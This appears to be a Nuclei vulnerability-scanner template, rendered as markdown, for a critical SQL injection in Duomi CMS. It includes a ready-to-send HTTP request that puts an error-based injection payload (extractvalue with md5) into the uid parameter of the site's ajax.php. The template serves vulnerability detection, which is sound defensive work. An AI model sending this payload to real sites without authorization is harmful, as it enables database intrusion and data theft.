# Nuclei Template: Duomi CMS - SQL Injection
**Template ID:** duomicms-sql-injection
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`duomicms-sql-injection.yaml`)

## Vulnerability Information & PoC

## Description
Duomi CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))
```

## References
- https://redn3ck.github.io/2016/11/01/duomiCMS/
